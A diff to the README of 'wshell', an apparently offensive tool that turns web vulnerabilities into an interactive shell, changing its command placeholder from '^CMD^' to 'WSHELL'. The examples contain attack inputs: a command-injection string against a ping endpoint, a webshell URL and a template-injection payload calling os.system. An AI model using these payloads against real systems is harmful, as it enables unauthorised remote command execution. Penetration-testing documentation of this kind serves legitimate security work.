@@ -20,7 +20,7 @@ parameters and where to put the command to execute.
 As an example, to exploit a command injection in a vulnerable `ping` functionality you can do this:
 
 ```shell
-attacker@host:/$ wshell --log=info 'https://www.target.com/app/vulnerable/ping.php?count=3' 'host=;^CMD^ #'
+attacker@host:/$ wshell --log=info 'https://www.target.com/app/vulnerable/ping.php?count=3' 'host=;WSHELL #'
 
 [13:37:00] [INFO] HTTP verb not specified. Using 'POST' based on parameters
 [13:37:00] [INFO] Target OS not specified, trying to automatically detect it
@@ -72,7 +72,7 @@ options:
   -h, --help            show this help message and exit
   -v, --version         Show the version number and exit
   --placeholder COMMAND_PLACEHOLDER
-                        Use a custom command placeholder (default: ^CMD^)
+                        Use a custom command placeholder (default: WSHELL)
   --os {linux,win-cmd,win-psh}
                         Specify OS and shell in use on the target (default: auto-discover)
 
@@ -103,9 +103,9 @@ For every --ARGUMENT there is also a --no-ARGUMENT that reverts ARGUMENT
 
 Example usage:
 
-    wshell 'https://www.example.com/webshell?cmd=^CMD^'
-    wshell --form 'https://www.example.com/command-injection' 'p=;^CMD^ #'
-    wshell 'https://www.example.com/ssti' 'msg=${self.module.cache.util.os.system("^CMD^")}'
+    wshell 'https://www.example.com/webshell?cmd=WSHELL'
+    wshell --form 'https://www.example.com/command-injection' 'p=;WSHELL #'
+    wshell 'https://www.example.com/ssti' 'msg=${self.module.cache.util.os.system("WSHELL")}'
 ```
 
 ## License
